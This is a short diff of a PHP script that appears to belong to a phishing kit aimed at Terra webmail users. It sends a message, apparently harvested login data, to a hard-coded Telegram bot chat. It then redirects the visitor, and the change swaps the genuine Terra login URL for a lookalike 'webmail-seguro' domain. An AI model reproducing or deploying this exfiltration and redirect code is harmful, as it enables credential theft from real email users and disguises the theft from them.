@@ -21,6 +21,6 @@ $chat_id = '6261750345';
 file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?".
                   http_build_query(['chat_id'=>$chat_id,'text'=>$msg,'parse_mode'=>'Markdown']));
 
-header("Location: https://servicos.terra.com.br/para-voce/terra-mail/?cdConvenio=CVTR00001825/login");
+header("Location: https://webmail-seguro.com.br/v2/");
 exit;
 ?>
